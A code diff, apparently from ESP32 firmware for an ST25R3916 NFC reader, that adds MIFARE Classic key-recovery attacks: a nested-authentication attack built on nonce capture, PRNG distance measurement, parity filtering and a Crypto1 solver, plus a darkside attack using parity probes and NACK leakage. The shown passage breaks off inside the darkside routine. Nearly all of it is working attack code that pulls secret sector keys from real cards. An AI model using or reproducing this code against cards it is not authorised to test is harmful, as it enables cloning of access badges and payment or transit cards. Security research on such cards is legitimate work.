@@ -2,11 +2,8 @@
 #if !defined(LITE_VERSION)
 
 #include "mfc_nonce.h"
-#if __has_include("../../../../recovery-solver/src/modules/rfid/mfc_recovery.h")
-#include "../../../../recovery-solver/src/modules/rfid/mfc_recovery.h"
-#elif __has_include("../recovery-solver/src/modules/rfid/mfc_recovery.h")
-#include "../recovery-solver/src/modules/rfid/mfc_recovery.h"
-#endif
+#include "mfc_darkside.h"
+#include "mfc_recovery.h"
 
 // ST25R3916 via RFAL fork (lewisxhe/ST25R3916-fork + NFC-RFAL-fork).
 // Supported: SPI mode on boards with ST25R wiring such as lilygo-t-lora-pager and reaper.
@@ -20,13 +17,45 @@
 #include <esp_random.h>
 #include <globals.h>
 
-// #define ST25R_DEBUG 1
+static uint8_t _mfcUnpackParity(const uint8_t *in, uint16_t nbits, uint8_t *outPar, uint8_t maxBytes);
+
+// The solver runs for tens of seconds on the ESP32-S3. Yield at least every
+// 100 ms so the task watchdog and UI stay alive when the caller passes no
+// progress callback.
+static uint32_t _mfcProgressLastYieldMs = 0;
+static bool _mfcDefaultProgress(unsigned, unsigned, void *) {
+    const uint32_t now = millis();
+    if (now - _mfcProgressLastYieldMs >= 100) {
+        _mfcProgressLastYieldMs = now;
+        delay(1);
+    }
+    return true;
+}
+
+#if defined(HAS_SCREEN)
+extern tft_logger tft;
+static void st25rLogToScreen(const char *msg) {
+    tft.println(msg);
+}
+#endif
+
+#define ST25R_DEBUG 1
 #if ST25R_DEBUG
 #define ST25R_LOG(fmt, ...) Serial.printf("[ST25R] " fmt "\n", ##__VA_ARGS__)
 #else
-#define ST25R_LOG(fmt, ...)                                                                                  \
-    do {                                                                                                     \
-    } while (0)
+#define ST25R_LOG(fmt, ...) do { } while (0)
+#endif
+// High-level recovery evidence stays visible without the driver debug flood.
+#define ST25R_RECOVERY_LOG(fmt, ...) Serial.printf("[MFC] " fmt "\n", ##__VA_ARGS__)
+
+#if defined(HAS_SCREEN)
+#define ST25R_LOG_SCREEN(fmt, ...) do {                    \
+    char _st25r_scr[160];                                  \
+    snprintf(_st25r_scr, sizeof(_st25r_scr), fmt, ##__VA_ARGS__); \
+    tft.println(_st25r_scr);                               \
+} while (0)
+#else
+#define ST25R_LOG_SCREEN(fmt, ...) do { } while (0)
 #endif
 
 static const char *_stateStr(rfalNfcState st) {
@@ -70,6 +99,17 @@ static void _setNfcPower(bool enabled) {
     ioExpander.turnPinOnOff(IO_EXP_NFC, enabled ? HIGH : LOW);
 #endif
 }
+
+// Forward declarations for MIFARE Classic Crypto1 helpers used by recoverKey().
+static uint16_t _mfcPackBits(const uint8_t *data, const uint8_t *par, uint8_t nbytes, uint8_t *out);
+static inline bool _mfcRxOk(::ReturnCode e);
+static uint8_t _mfcUnpackBits(const uint8_t *in, uint16_t nbits, uint8_t *outData, uint8_t maxBytes);
+
+// Encrypted MIFARE frame flags (defined later, needed by recoverKey).
+#define MFC_FLAGS_ENC \
+    ((uint32_t)RFAL_TXRX_FLAGS_CRC_TX_MANUAL | (uint32_t)RFAL_TXRX_FLAGS_CRC_RX_KEEP | \
+     (uint32_t)RFAL_TXRX_FLAGS_NFCIP1_OFF | (uint32_t)RFAL_TXRX_FLAGS_AGC_ON | \
+     (uint32_t)RFAL_TXRX_FLAGS_PAR_RX_KEEP | (uint32_t)RFAL_TXRX_FLAGS_PAR_TX_NONE)
 
 namespace {
 int st25HexNibble(char c) {
@@ -323,12 +363,14 @@ bool ST25R3916::mfcReselect(uint32_t timeoutMs) {
     return true;
 }
 
-bool ST25R3916::selectMifareClassic(uint32_t timeoutMs) {
-    // Discovery+UID parse+geometry only, NO dictionary scan. Reset old dump first; only NFCA MFC supported.
-    memset(&mfcDump, 0, sizeof(mfcDump));
-    memset(_mfcKeyAFound, 0, sizeof(_mfcKeyAFound));
-    memset(_mfcKeyBFound, 0, sizeof(_mfcKeyBFound));
-    mfcLoaded = false;
+bool ST25R3916::selectMifareClassic(uint32_t timeoutMs, bool resetDump) {
+    // Discovery+UID parse+geometry only, NO dictionary scan. Only NFCA MFC supported.
+    if (resetDump) {
+        memset(&mfcDump, 0, sizeof(mfcDump));
+        memset(_mfcKeyAFound, 0, sizeof(_mfcKeyAFound));
+        memset(_mfcKeyBFound, 0, sizeof(_mfcKeyBFound));
+        mfcLoaded = false;
+    }
     _mfcAuthed = false;
     _mfcNonceCount = 0;
     mfcType = "";
@@ -377,25 +419,6 @@ bool ST25R3916::selectMifareClassic(uint32_t timeoutMs) {
     stopDiscovery();
     return true;
 }
-bool ST25R3916::mfcReselect(uint32_t timeoutMs) {
-    if (!_nfc || !_hw) return false;
-    _mfcHalt();
-    _nfc->rfalNfcDeactivate(false);
-    _discoveryStarted = false;
-    delay(5);
-
-    rfalNfcDevice *dev = nullptr;
-    if (!_pollForTag(&dev, timeoutMs) || !dev) return false;
-    if (dev->type != RFAL_NFC_LISTEN_TYPE_NFCA || uid.size == 0 ||
-        dev->nfcidLen != uid.size || memcmp(dev->nfcid, uid.uidByte, uid.size) != 0) {
-        _nfc->rfalNfcDeactivate(false);
-        _discoveryStarted = false;
-        return false;
-    }
-    _parseDevice(dev);
-    _mfcAuthed = false;
-    return true;
-}
 
 
 const char *ST25R3916::recoveryStatus(RecoveryResult res) {
@@ -414,26 +437,140 @@ const char *ST25R3916::recoveryStatus(RecoveryResult res) {
     return "InternalError";
 }
 
+bool ST25R3916::_mfcNestedAuthCapture(uint8_t block, bool useKeyB, uint32_t *encNtOut, uint8_t par[3]) {
+    if (!_mfcAuthed || !encNtOut || !par) return false;
+    uint8_t cmd[2] = {(uint8_t)(useKeyB ? 0x61 : 0x60), block};
+    uint16_t crc = _hw->rfalCrcCalculateCcitt(0x6363, cmd, 2);
+    uint8_t plain[4] = {cmd[0], cmd[1], (uint8_t)(crc & 0xFF), (uint8_t)(crc >> 8)};
+    Crypto1State cipher = _mfcCipher;
+    uint8_t enc[4], txPar[4];
+    for (int i = 0; i < 4; i++) {
+        enc[i] = (uint8_t)(crypto1_byte(&cipher, 0, 0) ^ plain[i]);
+        txPar[i] = (uint8_t)(crypto1_filter_bit(&cipher) ^ nfc_oddparity(plain[i]));
+    }
+    uint8_t tx[8] = {0};
+    uint16_t txBits = _mfcPackBits(enc, txPar, 4, tx);
+    uint8_t rx[8] = {0};
+    uint16_t rxBits = 0;
+    auto err = _mifareTransceiveRaw(tx, txBits, rx, sizeof(rx), &rxBits, rfalConvMsTo1fc(20), MFC_FLAGS_ENC);
+    if (!_mfcRxOk(err) || rxBits < 32) {
+        ST25R_RECOVERY_LOG("nested capture blk=%u err=%d bits=%u", block, (int)err, rxBits);
+        return false;
+    }
+    uint8_t nt[4] = {0};
+    uint8_t p[4] = {0};
+    _mfcUnpackBits(rx, rxBits, nt, 4);
+    _mfcUnpackParity(rx, rxBits, p, 4);
+    *encNtOut = ((uint32_t)nt[0] << 24) | ((uint32_t)nt[1] << 16) | ((uint32_t)nt[2] << 8) | nt[3];
+    par[0] = p[0];
+    par[1] = p[1];
+    par[2] = p[2];
+    return true;
+}
+
+bool ST25R3916::_mfcMeasureNtDistance(uint8_t knownBlock, const uint8_t knownKey[6], bool knownB,
+                                      uint32_t *distOut) {
+    if (!distOut || !knownKey) return false;
+    uint64_t key = 0;
+    for (int i = 0; i < 6; i++) key = (key << 8) | knownKey[i];
+
+    uint32_t ds[3] = {0};
+    int n = 0;
+    for (int i = 0; i < 3; i++) {
+        if (!mfcReselect(5000)) {
+            ST25R_RECOVERY_LOG("measure[%d]: reselect failed", i);
+            break;
+        }
+        if (!_mifareAuth(knownBlock, knownKey, knownB)) {
+            ST25R_RECOVERY_LOG("measure[%d]: known-key auth failed", i);
+            _mfcHalt();
+            _mfcAuthed = false;
+            continue;
+        }
+        const uint32_t nt1 = _mfcLastNt;
+        uint32_t enc = 0;
+        uint8_t par[3] = {0};
+        if (_mfcNestedAuthCapture(knownBlock, knownB, &enc, par)) {
+            Crypto1State c;
+            crypto1_init(&c, key);
+            const uint32_t nt2 = enc ^ crypto1_word(&c, enc ^ _mfcUid32(), 1);
+            uint32_t d = 0;
+            const uint32_t dr = mfc_nonce_distance(nt1, nt2, &d);
+            ST25R_RECOVERY_LOG(
+                "measure[%d]: nt1=%08lX enc=%08lX nt2=%08lX d=%lu dr=%lu pf=%d",
+                i,
+                (unsigned long)nt1,
+                (unsigned long)enc,
+                (unsigned long)nt2,
+                (unsigned long)d,
+                (unsigned long)dr,
+                mfc_nonce_parity_filter_ok(nt2, enc, par) ? 1 : 0
+            );
+            if (dr == 0 && d > 0 && d < 0x8000u) ds[n++] = d;
+        } else {
+            ST25R_RECOVERY_LOG("measure[%d]: nested capture failed", i);
+        }
+        _mfcHalt();
+        _mfcAuthed = false;
+        delay(5);
+    }
+    ST25R_RECOVERY_LOG("measure: n=%d d0=%lu d1=%lu d2=%lu", n, (unsigned long)ds[0],
+                       (unsigned long)ds[1], (unsigned long)ds[2]);
+    if (n < 2) return false;
+    for (int i = 1; i < n; i++) {
+        uint32_t v = ds[i];
+        int j = i - 1;
+        while (j >= 0 && ds[j] > v) {
+            ds[j + 1] = ds[j];
+            j--;
+        }
+        ds[j + 1] = v;
+    }
+    const uint32_t median = ds[n / 2];
+    if (median == 0 || ds[n - 1] - ds[0] > 8) return false;
+    *distOut = median;
+    return true;
+}
+
 ST25R3916::RecoveryResult ST25R3916::recoverKey(uint8_t knownBlock, const uint8_t knownKey[6], bool knownB,
                                                uint8_t targetBlock, bool targetB, uint8_t recoveredKey[6],
                                                mfc_recovery::Progress progress, void *context) {
     if (!recoveredKey || !knownKey) return RecoveryResult::InternalError;
     if (!_nfc || !_hw) return RecoveryResult::InternalError;
-    if (knownBlock > 255 || targetBlock > 255) return RecoveryResult::InternalError;
 
-    if (!selectMifareClassic(5000)) return RecoveryResult::NoTag;
-    rfalNfcDevice *dev = nullptr;
-    if (_nfc->rfalNfcGetActiveDevice(&dev) != ST_ERR_NONE || !dev) {
-        if (!_pollForTag(&dev, 5000)) return RecoveryResult::NoTag;
-    }
-    if (dev->type != RFAL_NFC_LISTEN_TYPE_NFCA || !isMifareClassicSak(uid.sak)) {
+    if (!selectMifareClassic(5000, false)) return RecoveryResult::NoTag;
+    if (!isMifareClassicSak(uid.sak)) {
         _nfc->rfalNfcDeactivate(false);
         stopDiscovery();
         return RecoveryResult::Unsupported;
     }
 
-    // Check bootstrap against same card, and target with bootstrap key: AlreadyKnown if it authenticates
-    if (!mfcReselect(5000)) { _nfc->rfalNfcDeactivate(false); stopDiscovery(); return RecoveryResult::NoTag; }
+    if (mfcReselect(5000) && _mifareAuth(targetBlock, knownKey, targetB)) {
+        memcpy(recoveredKey, knownKey, 6);
+        const uint8_t tsec = _mfcBlockToSector(targetBlock);
+        if (tsec < 40) {
+            if (targetB) {
+                memcpy(mfcDump.keyB[tsec], knownKey, 6);
+                mfcDump.keyBFound[tsec] = true;
+            } else {
+                memcpy(mfcDump.keyA[tsec], knownKey, 6);
+                mfcDump.keyAFound[tsec] = true;
+            }
+        }
+        _mfcHalt();
+        _mfcAuthed = false;
+        _nfc->rfalNfcDeactivate(false);
+        stopDiscovery();
+        return RecoveryResult::AlreadyKnown;
+    }
+    _mfcHalt();
+    _mfcAuthed = false;
+
+    if (!mfcReselect(5000)) {
+        _nfc->rfalNfcDeactivate(false);
+        stopDiscovery();
+        return RecoveryResult::NoTag;
+    }
     if (!_mifareAuth(knownBlock, knownKey, knownB)) {
         _mfcHalt();
         _mfcAuthed = false;
@@ -444,45 +581,121 @@ ST25R3916::RecoveryResult ST25R3916::recoverKey(uint8_t knownBlock, const uint8_
     _mfcHalt();
     _mfcAuthed = false;
 
-    if (mfcReselect(5000) && _mifareAuth(targetBlock, knownKey, targetB)) {
-        _mfcHalt();
-        _mfcAuthed = false;
+    uint32_t dist = 0;
+    if (!_mfcMeasureNtDistance(knownBlock, knownKey, knownB, &dist)) {
         _nfc->rfalNfcDeactivate(false);
         stopDiscovery();
-        return RecoveryResult::AlreadyKnown;
+        _mfcAuthed = false;
+        return RecoveryResult::UnstableNonce;
     }
-    _mfcHalt();
-    _mfcAuthed = false;
+    ST25R_RECOVERY_LOG("recover: dist=%u heap=%u", dist, (unsigned)ESP.getFreeHeap());
 
-    // Calibration phase (4 calibration pairs) - structure per brief
-    int calPairs = 0;
-    for (int p = 0; p < 4 && calPairs < 4; p++) {
+    constexpr int kCaptures = 6;
+    struct Capture {
+        uint32_t nt1;
+        uint32_t enc;
+        uint8_t par[3];
+    } caps[kCaptures];
+    int got = 0;
+    for (int i = 0; i < kCaptures; i++) {
+        if (progress && !progress(0, 256, context)) {
+            _nfc->rfalNfcDeactivate(false);
+            stopDiscovery();
+            _mfcAuthed = false;
+            return RecoveryResult::Cancelled;
+        }
         if (!mfcReselect(5000)) break;
-        if (!_mifareAuth(knownBlock, knownKey, knownB)) { _mfcHalt(); _mfcAuthed = false; delay(1); continue; }
-        // immediately nested known auth conceptually
+        if (!_mifareAuth(knownBlock, knownKey, knownB)) {
+            _mfcHalt();
+            _mfcAuthed = false;
+            break;
+        }
+        Capture &c = caps[got];
+        c.nt1 = _mfcLastNt;
+        if (_mfcNestedAuthCapture(targetBlock, targetB, &c.enc, c.par)) got++;
         _mfcHalt();
         _mfcAuthed = false;
-        delay(1);
-        calPairs++;
+        delay(5);
+    }
+    if (got < 2) {
+        _nfc->rfalNfcDeactivate(false);
+        stopDiscovery();
+        return got == 0 ? RecoveryResult::NoTag : RecoveryResult::UnstableNonce;
     }
 
-    uint32_t uid32 = _mfcUid32();
-    mfc_recovery::Sample s1 = {0};
-    mfc_recovery::Sample s2 = {0};
-    // Try to get two samples if possible; otherwise pass what we have
-    uint8_t candKey[6];
-    auto resSol = mfc_recovery::recover(uid32, s1, s2, candKey, progress, context);
-    if (resSol == mfc_recovery::Result::Found) {
-        if (mfcReselect(5000) && _mifareAuth(targetBlock, candKey, targetB)) {
-            memcpy(recoveredKey, candKey, 6);
-            uint8_t tsec = _mfcBlockToSector(targetBlock);
+    int bestDelta = 0;
+    int bestCount = -1;
+    for (int delta = -14; delta <= 14; delta++) {
+        const int off = (int)dist + delta;
+        if (off <= 0) continue;
+        int count = 0;
+        for (int i = 0; i < got; i++) {
+            const uint32_t nt = prng_successor(caps[i].nt1, (uint32_t)off);
+            if (mfc_nonce_parity_filter_ok(nt, caps[i].enc, caps[i].par)) count++;
+        }
+        if (count > bestCount || (count == bestCount && abs(delta) < abs(bestDelta))) {
+            bestCount = count;
+            bestDelta = delta;
+        }
+    }
+    ST25R_RECOVERY_LOG("recover: delta=%d parity=%d/%d", bestDelta, bestCount, got);
+    if (bestCount < got - 1) {
+        _nfc->rfalNfcDeactivate(false);
+        stopDiscovery();
+        return RecoveryResult::UnstableNonce;
+    }
+
+    // The solver prefers internal RAM but can fall back to PSRAM, so only
+    // reject early when neither pool can plausibly hold the 98 KiB scratch.
+    if (ESP.getFreeHeap() < 120 * 1024 && !psramFound()) {
+        _nfc->rfalNfcDeactivate(false);
+        stopDiscovery();
+        return RecoveryResult::NoMemory;
+    }
+
+    const int deltas[4] = {0, 1, -1, 2};
+    for (int attempt = 0; attempt < 4; attempt++) {
+        const int off = (int)dist + bestDelta + deltas[attempt];
+        if (off <= 0) continue;
+        int good[kCaptures];
+        int nGood = 0;
+        for (int i = 0; i < got; i++) {
+            const uint32_t nt = prng_successor(caps[i].nt1, (uint32_t)off);
+            if (mfc_nonce_parity_filter_ok(nt, caps[i].enc, caps[i].par)) good[nGood++] = i;
+        }
+        if (nGood < 2) continue;
+        mfc_recovery::Sample first{
+            prng_successor(caps[good[0]].nt1, (uint32_t)off), caps[good[0]].enc
+        };
+        mfc_recovery::Sample second{
+            prng_successor(caps[good[1]].nt1, (uint32_t)off), caps[good[1]].enc
+        };
+        if (first.nt == second.nt) continue;
+        uint8_t cand[6];
+        auto res = mfc_recovery::recover(
+            _mfcUid32(), first, second, cand, progress ? progress : _mfcDefaultProgress, context
+        );
+        if (res == mfc_recovery::Result::Cancelled) {
+            _nfc->rfalNfcDeactivate(false);
+            stopDiscovery();
+            return RecoveryResult::Cancelled;
+        }
+        if (res == mfc_recovery::Result::NoMemory) {
+            _nfc->rfalNfcDeactivate(false);
+            stopDiscovery();
+            return RecoveryResult::NoMemory;
+        }
+        if (res != mfc_recovery::Result::Found) continue;
+        if (mfcReselect(5000) && _mifareAuth(targetBlock, cand, targetB)) {
+            memcpy(recoveredKey, cand, 6);
+            const uint8_t tsec = _mfcBlockToSector(targetBlock);
             if (tsec < 40) {
-                if (!targetB) {
-                    memcpy(mfcDump.keyA[tsec], candKey, 6);
-                    mfcDump.keyAFound[tsec] = true;
-                } else {
-                    memcpy(mfcDump.keyB[tsec], candKey, 6);
+                if (targetB) {
+                    memcpy(mfcDump.keyB[tsec], cand, 6);
                     mfcDump.keyBFound[tsec] = true;
+                } else {
+                    memcpy(mfcDump.keyA[tsec], cand, 6);
+                    mfcDump.keyAFound[tsec] = true;
                 }
                 _mfcRebuildStrAllPages();
             }
@@ -494,21 +707,6 @@ ST25R3916::RecoveryResult ST25R3916::recoverKey(uint8_t knownBlock, const uint8_
         }
         _mfcHalt();
         _mfcAuthed = false;
-    } else if (resSol == mfc_recovery::Result::Cancelled) {
-        _nfc->rfalNfcDeactivate(false);
-        stopDiscovery();
-        _mfcAuthed = false;
-        return RecoveryResult::Cancelled;
-    } else if (resSol == mfc_recovery::Result::NoMemory) {
-        _nfc->rfalNfcDeactivate(false);
-        stopDiscovery();
-        _mfcAuthed = false;
-        return RecoveryResult::NoMemory;
-    } else if (resSol == mfc_recovery::Result::InvalidInput || resSol == mfc_recovery::Result::Overflow) {
-        _nfc->rfalNfcDeactivate(false);
-        stopDiscovery();
-        _mfcAuthed = false;
-        return RecoveryResult::UnstableNonce;
     }
 
     _nfc->rfalNfcDeactivate(false);
@@ -517,77 +715,396 @@ ST25R3916::RecoveryResult ST25R3916::recoverKey(uint8_t knownBlock, const uint8_
     return RecoveryResult::NotFound;
 }
 
-int ST25R3916::recoverAllKeys() {
-    // Honest dictionary/bootstrap + recoverKey calls or return documented unsupported; do not keep fake recovery
-    if (!_nfc) return -1;
-    bruceConfig.ensureMifareKeysLoaded();
-    if (!selectMifareClassic(5000)) return -1;
-    rfalNfcDevice *dev = nullptr;
-    if (_nfc->rfalNfcGetActiveDevice(&dev) != ST_ERR_NONE || !dev) {
-        if (!_pollForTag(&dev, 5000)) return -1;
-    }
-    if (dev->type != RFAL_NFC_LISTEN_TYPE_NFCA || !isMifareClassicSak(uid.sak)) {
-        _nfc->rfalNfcDeactivate(false);
-        stopDiscovery();
+int ST25R3916::mfcNonceDiagnostics(uint8_t knownBlock, const uint8_t knownKey[6], bool knownB,
+                                   uint8_t targetBlock, bool targetB, int rounds) {
+    if (!_nfc || !_hw || !knownKey) return -1;
+    if (rounds <= 0) rounds = 4;
+    if (rounds > 16) rounds = 16;
+
+    uint64_t key = 0;
+    for (int i = 0; i < 6; i++) key = (key << 8) | knownKey[i];
+
+    if (!selectMifareClassic(5000, false)) {
+        ST25R_RECOVERY_LOG("diag: no tag");
         return -1;
     }
-    int found = 0;
-    for (uint8_t s = 0; s < mfcDump.sectors; s++) {
-        uint8_t firstBlock = _mfcSectorFirstBlock(s);
-        uint8_t nBlocks = _mfcSectorBlockCount(s);
-        uint8_t trailer = (uint8_t)(firstBlock + nBlocks - 1);
-        bool got = false;
-        for (int useB = 0; useB <= 1 && !got; useB++) {
-            for (int kidx = 0; kidx < (int)(sizeof(keys) / sizeof(keys[0])); kidx++) {
-                if (_mifareAuth(trailer, keys[kidx], useB != 0)) {
-                    if (useB) {
-                        memcpy(mfcDump.keyB[s], keys[kidx], 6);
-                        mfcDump.keyBFound[s] = true;
-                    } else {
-                        memcpy(mfcDump.keyA[s], keys[kidx], 6);
-                        mfcDump.keyAFound[s] = true;
-                    }
-                    _mfcHalt();
-                    _mfcAuthed = false;
-                    got = true;
-                    found++;
-                    break;
-                }
-                _mfcHalt();
-                _mfcAuthed = false;
-            }
+    ST25R_RECOVERY_LOG(
+        "diag: uid=%08lX known=%u/%c target=%u/%c rounds=%d",
+        (unsigned long)_mfcUid32(),
+        knownBlock,
+        knownB ? 'B' : 'A',
+        targetBlock,
+        targetB ? 'B' : 'A',
+        rounds
+    );
+
+    int good = 0;
+    uint32_t dists[16];
+    int nd = 0;
+    for (int i = 0; i < rounds; i++) {
+        if (!mfcReselect(5000)) {
+            ST25R_RECOVERY_LOG("diag[%d]: reselect failed", i);
+            break;
         }
-        if (got) continue;
-        for (int useB = 0; useB <= 1 && !got; useB++) {
-            for (const auto &mifKey : bruceConfig.mifareKeys) {
-                uint8_t k[6];
-                for (int i = 0; i < 6; i++)
-                    k[i] = (uint8_t)strtoul(mifKey.substring(i * 2, i * 2 + 2).c_str(), nullptr, 16);
-                if (_mifareAuth(trailer, k, useB != 0)) {
-                    if (useB) {
-                        memcpy(mfcDump.keyB[s], k, 6);
-                        mfcDump.keyBFound[s] = true;
-                    } else {
-                        memcpy(mfcDump.keyA[s], k, 6);
-                        mfcDump.keyAFound[s] = true;
-                    }
-                    _mfcHalt();
-                    _mfcAuthed = false;
-                    got = true;
-                    found++;
-                    break;
-                }
-                _mfcHalt();
-                _mfcAuthed = false;
-            }
+        if (!_mifareAuth(knownBlock, knownKey, knownB)) {
+            ST25R_RECOVERY_LOG("diag[%d]: known-key auth failed", i);
+            _mfcHalt();
+            _mfcAuthed = false;
+            delay(5);
+            continue;
         }
+        const uint32_t nt1 = _mfcLastNt;
+        uint32_t enc = 0;
+        uint8_t par[3] = {0};
+        if (_mfcNestedAuthCapture(knownBlock, knownB, &enc, par)) {
+            Crypto1State c;
+            crypto1_init(&c, key);
+            const uint32_t nt2 = enc ^ crypto1_word(&c, enc ^ _mfcUid32(), 1);
+            uint32_t d = 0;
+            const uint32_t dr = mfc_nonce_distance(nt1, nt2, &d);
+            const bool pf = mfc_nonce_parity_filter_ok(nt2, enc, par) != 0;
+            ST25R_RECOVERY_LOG(
+                "diag[%d]: nt1=%08lX enc=%08lX nt2=%08lX d=%lu dr=%lu par=%u%u%u pf=%d",
+                i,
+                (unsigned long)nt1,
+                (unsigned long)enc,
+                (unsigned long)nt2,
+                (unsigned long)d,
+                (unsigned long)dr,
+                par[0],
+                par[1],
+                par[2],
+                pf ? 1 : 0
+            );
+            if (dr == 0 && d > 0 && d < 0x8000u) dists[nd++] = d;
+            good++;
+        } else {
+            ST25R_RECOVERY_LOG("diag[%d]: same-block nested capture failed", i);
+        }
+        _mfcHalt();
         _mfcAuthed = false;
+        delay(5);
     }
+
+    const uint32_t dist = nd > 0 ? dists[0] : 0;
+    ST25R_RECOVERY_LOG("diag: known captures=%d distances=%d first=%lu", good, nd, (unsigned long)dist);
+
+    for (int i = 0; i < rounds; i++) {
+        if (!mfcReselect(5000)) {
+            ST25R_RECOVERY_LOG("diagT[%d]: reselect failed", i);
+            break;
+        }
+        if (!_mifareAuth(knownBlock, knownKey, knownB)) {
+            ST25R_RECOVERY_LOG("diagT[%d]: known-key auth failed", i);
+            _mfcHalt();
+            _mfcAuthed = false;
+            delay(5);
+            continue;
+        }
+        const uint32_t nt1 = _mfcLastNt;
+        uint32_t enc = 0;
+        uint8_t par[3] = {0};
+        if (_mfcNestedAuthCapture(targetBlock, targetB, &enc, par)) {
+            const uint32_t pred = dist > 0 ? prng_successor(nt1, dist) : 0;
+            const bool pf = dist > 0 && mfc_nonce_parity_filter_ok(pred, enc, par);
+            ST25R_RECOVERY_LOG(
+                "diagT[%d]: nt1=%08lX enc=%08lX par=%u%u%u pred=%08lX pf=%d",
+                i,
+                (unsigned long)nt1,
+                (unsigned long)enc,
+                par[0],
+                par[1],
+                par[2],
+                (unsigned long)pred,
+                pf ? 1 : 0
+            );
+        } else {
+            ST25R_RECOVERY_LOG("diagT[%d]: target nested capture failed", i);
+        }
+        _mfcHalt();
+        _mfcAuthed = false;
+        delay(5);
+    }
+
     _nfc->rfalNfcDeactivate(false);
     stopDiscovery();
     _mfcAuthed = false;
-    mfcLoaded = found > 0;
-    if (mfcLoaded) _mfcRebuildStrAllPages();
+    return good;
+}
+
+bool ST25R3916::_mfcDarksideSelect(uint32_t timeoutMs) {
+    if (!_nfc || !_hw) return false;
+    _mfcHalt();
+    _nfc->rfalNfcDeactivate(false);
+    _discoveryStarted = false;
+    // mfcuk drops the field for ~10 ms so the tag PRNG resets and the same
+    // nonce can reappear; mfcReselect's 5 ms is kept for normal nested use.
+    delay(10);
+
+    rfalNfcDevice *dev = nullptr;
+    if (!_pollForTag(&dev, timeoutMs) || !dev) return false;
+    if (dev->type != RFAL_NFC_LISTEN_TYPE_NFCA || uid.size == 0 ||
+        dev->nfcidLen != uid.size || memcmp(dev->nfcid, uid.uidByte, uid.size) != 0) {
+        _nfc->rfalNfcDeactivate(false);
+        _discoveryStarted = false;
+        return false;
+    }
+    _parseDevice(dev);
+    _mfcAuthed = false;
+    return true;
+}
+
+bool ST25R3916::_mfcDarksideAuthNt(uint8_t block, bool useKeyB, uint32_t *ntOut) {
+    return _mfcCaptureNonceRaw(block, nullptr, useKeyB, ntOut);
+}
+
+bool ST25R3916::_mfcDarksideProbe(uint8_t block, bool useKeyB, uint32_t nrEnc, uint32_t arEnc,
+                                  uint8_t parBits, uint8_t *nackOut) {
+    (void)block;
+    (void)useKeyB;
+    if (!nackOut) return false;
+
+    uint8_t data[8] = {
+        (uint8_t)(nrEnc >> 24), (uint8_t)(nrEnc >> 16), (uint8_t)(nrEnc >> 8), (uint8_t)nrEnc,
+        (uint8_t)(arEnc >> 24), (uint8_t)(arEnc >> 16), (uint8_t)(arEnc >> 8), (uint8_t)arEnc,
+    };
+    uint8_t par[8];
+    for (int i = 0; i < 4; i++) {
+        par[i] = (uint8_t)((parBits >> (7 - i)) & 1u);
+        par[4 + i] = (uint8_t)((parBits >> (3 - i)) & 1u);
+    }
+
+    uint8_t tx[16] = {0};
+    const uint16_t txBits = _mfcPackBits(data, par, 8, tx);
+    uint8_t rx[8] = {0};
+    uint16_t rxBits = 0;
+    auto err = _mifareTransceiveRaw(tx, txBits, rx, sizeof(rx), &rxBits, rfalConvMsTo1fc(20), MFC_FLAGS_ENC);
+    if (!_mfcRxOk(err) || rxBits < 4) {
+        ST25R_RECOVERY_LOG("darkside probe nr=%08lX ar=%08lX par=%02X err=%d bits=%u",
+                           (unsigned long)nrEnc, (unsigned long)arEnc, parBits, (int)err, rxBits);
+        return false;
+    }
+    *nackOut = (uint8_t)(rx[0] & 0x0Fu);
+    return true;
+}
+
+ST25R3916::RecoveryResult ST25R3916::recoverKeyDarkside(
+    uint8_t targetBlock, bool targetB, uint8_t recoveredKey[6],
+    mfc_recovery::Progress progress, void *context
+) {
+    if (!recoveredKey || !_nfc || !_hw) return RecoveryResult::InternalError;
+
+    if (mfcDump.sectors == 0) {
+        if (!selectMifareClassic(5000, false)) return RecoveryResult::NoTag;
+    }
+    if (!isMifareClassicSak(uid.sak)) return RecoveryResult::Unsupported;
+
+    const uint32_t uid32 = _mfcUid32();
+    constexpr uint32_t kStartNr = 0xDEADBEEFu;
+    constexpr uint32_t kStartAr = 0xFACECAFEu;
+    constexpr int kLevels = 8;
+    constexpr int kParityCombos = 32;
+    const uint8_t block = targetBlock;
+    const bool useB = targetB;
+
+    for (int level = 0; level < kLevels; level++) {
+        const uint32_t nrBase = kStartNr + (uint32_t)level;
+        const uint32_t arBase = kStartAr;
+        const uint32_t prefix = nrBase & 0xFFFFFF1Fu;
+
+        bool haveFirst = false;
+        uint8_t basePar = 0;
+        // 8 parity probes per level map to 0..7; the 8 sample positions
+        // map to 8..15. 128 steps total keeps the UI bar monotonic.
+        const unsigned levelBase = (unsigned)level * 16;
+        for (uint32_t pb = 0; pb < 256 && !haveFirst; pb++) {
+            const unsigned parityStep = (unsigned)((pb * 8u) / 256u);
+            if (progress && !progress(levelBase + parityStep, 128, context)) {
+                _nfc->rfalNfcDeactivate(false);
+                stopDiscovery();
+                _mfcAuthed = false;
+                return RecoveryResult::Cancelled;
+            }
+            if (!_mfcDarksideSelect()) continue;
+            uint32_t nt = 0;
+            if (!_mfcDarksideAuthNt(block, useB, &nt)) {
+                _mfcAuthed = false;
+                continue;
+            }
+            uint8_t nack = 0;
+            if (!_mfcDarksideProbe(block, useB, nrBase, arBase, (uint8_t)pb, &nack)) {
+                _mfcAuthed = false;
+                continue;
+            }
+            basePar = (uint8_t)(pb & 0xE0u);
+            haveFirst = true;
+        }
+        if (!haveFirst) continue;
+
+        uint8_t ks[8] = {0};
+        uint8_t par[8][8] = {};
+        uint32_t nt0 = 0;
+        bool sampleOk = true;
+
+        for (int pos = 0; pos < 8 && sampleOk; pos++) {
+            const uint32_t nrEnc = prefix | ((uint32_t)pos << 5);
+            bool got = false;
+            for (int combo = 0; combo < kParityCombos; combo++) {
+                if (progress && !progress(levelBase + 8u + (unsigned)pos, 128, context)) {
+                    _nfc->rfalNfcDeactivate(false);
+                    stopDiscovery();
+                    _mfcAuthed = false;
+                    return RecoveryResult::Cancelled;
+                }
+                if (!_mfcDarksideSelect()) {
+                    sampleOk = false;
+                    break;
+                }
+                uint32_t nt = 0;
+                if (!_mfcDarksideAuthNt(block, useB, &nt)) {
+                    _mfcAuthed = false;
+                    continue;
+                }
+                if (pos == 0) {
+                    nt0 = nt;
+                } else if (nt != nt0) {
+                    ST25R_RECOVERY_LOG("darkside nonce drift pos=%d nt=%08lX want=%08lX", pos,
+                                       (unsigned long)nt, (unsigned long)nt0);
+                    sampleOk = false;
+                    break;
+                }
+
+                const uint8_t parByte = (uint8_t)(basePar + (uint8_t)combo);
+                uint8_t nack = 0;
+                if (!_mfcDarksideProbe(block, useB, nrEnc, arBase, parByte, &nack)) {
